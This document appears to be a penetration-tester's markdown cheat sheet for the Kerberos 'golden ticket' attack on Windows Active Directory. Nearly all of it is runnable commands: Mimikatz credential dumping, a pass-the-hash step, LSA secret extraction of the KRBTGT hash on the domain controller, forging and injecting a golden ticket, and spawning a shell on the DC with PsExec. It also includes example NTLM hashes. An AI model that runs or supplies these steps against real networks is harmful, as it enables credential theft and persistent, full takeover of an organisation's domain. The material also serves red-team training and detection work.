---
title: Golden Ticket
draft: false
tags:
  - windows
  - active-directory
  - recon
  - info-gathering
  - active
---
 
Generate a TGT, escalate privileges and obtain DC access.

> [!Requirements]
> Access to a Domain Admins group account or have compromised the domain controller itself.

1. Extract administrator NTLM hash (must be domain admin) and access the DC:
```powershell
PS> powershell -ep bypass
PS> . .\Invoke-Mimikatz.ps1

+ EXTRACT ADMIN NTLM HASH +
PS> dir \\DC_FQDN/c$ (verify if we can access the DC -> we shouldnt)
PS> Invoke-Mimkatz -Command '"privilege::debug" "sekurlsa::logonpasswords"' (extract the NTLM hash of the users that are loged in)
*copy the NTLM hash for the user administrator*
84398159ce4d01cfe10cf34d5dae3909
```

2. Execute PtH attack
```powershell
PS> Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:DOMAIN_FQDN /ntlm:ADMIN_NTLM_HASH /run:powershell.exe"' (perform the PtH attack to obtain domain admin privileges)
```

3. Retrieve KRBTGT account hash (krbtgt is the service account that issues/encrypts TGTs):
```powershell
PS [domain admin session]> powershell -ep bypass
PS [domain admin session]> . .\Invoke-Mimikatz.ps1
PS [domain admin session]> Invoke-Mimikatz -Command '"privilege::debug; lsadump::lsa /patch"' -ComputerName DC_FQDN (dump LSA secrets on the DC and patch the process to allow exporting secrets)
*copy the KRBTGT NTLM hash*
0e3cab3ba66afddb664025d96a8dc4d2
```

> [!Info]
> Delete any kerberos tickets using `mimikatz # kerberos::purge`

4. Generate and implement a golden ticket
```powershell
PS> Invoke-Mimikatz -Command '"kerberos::golden /user:DOMAIN_USER /domain:DOMAIN_FQDN /sid:DOMAIN_SID /krbtgt:KRBTGT_NTLM id:500 /groups:512 /startoffset:0 /ending:600 /renewmax:10080 /ptt"'
Parameters:
user: user for whom the ticket is generated
domain: domain
sid: SID of the domain
krbtgt: ntlm hash of the krbtgt account
id: user rid (admin standard: 500) (optional)
group: user group membership (admin standard: 512) (optional)
startoffset: ticket valid time (optional)
ending: expiration time (optional)
renewmax: maximum renewable time (optional)
ptt: injects the ticket into the current PSH session

PS> klist (check if we have created the golden ticket)
```

> [!Note]
> Creating a golden ticket and injecting it into memory doesnt require administrative privileges and can be performed from a non-joined domain host.

5. Access to DC
```powershell
mimikatz # misc::cmd (spawn a CMD)
C:\> PsExec.exe \\DC_HOSTNAME cmd.exe # spawn a cmd on the DC
C:\> whoami /groups # verify that we are part of the domain admins group


PS> dir \\DC_FQDN\c$
```

> [!Note]
> By accessing the DC using the IP address, we would be forced to use the NTLM authentication and access wont be granted:
> `$ psexec.exe \\DC_IP cmd.exe`
